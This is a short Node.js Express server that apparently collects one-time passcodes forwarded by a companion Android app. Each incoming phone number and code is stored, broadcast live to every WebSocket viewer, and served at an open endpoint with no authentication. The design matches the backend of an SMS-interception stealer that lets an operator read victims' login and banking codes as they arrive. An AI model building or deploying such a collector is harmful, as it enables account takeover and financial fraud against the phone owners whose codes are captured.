const express = require('express');
const { WebSocketServer } = require('ws');

const app = express();

// In-memory storage for OTPs
const otpData = {};

// WebSocket setup
const wss = new WebSocketServer({ noServer: true });
const clients = [];
wss.on('connection', (ws) => {
    console.log('WebSocket connected');
    clients.push(ws);

    ws.on('close', () => {
        console.log('WebSocket disconnected');
        const index = clients.indexOf(ws);
        if (index > -1) {
            clients.splice(index, 1);
        }
    });
});

// Route for serving the frontend
app.use(express.static('public'));

// Route for adding OTPs (used by the APK)
app.get('/add-otp', (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    // Save OTP in memory
    otpData[phone] = otp;

    // Notify all WebSocket clients
    const message = JSON.stringify({ phone, otp });
    clients.forEach((ws) => ws.send(message));

    res.status(200).json({
        message: `OTP ${otp} received for phone ${phone}`,
        status: 'success',
    });
});

// Route for fetching all stored OTPs
app.get('/fetch-otp-data', (req, res) => {
    res.json(otpData);
});

// Start server and WebSocket
const server = app.listen(process.env.PORT || 3000, () => {
    console.log(`Server running on port ${process.env.PORT || 3000}`);
});

server.on('upgrade', (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
    });
});
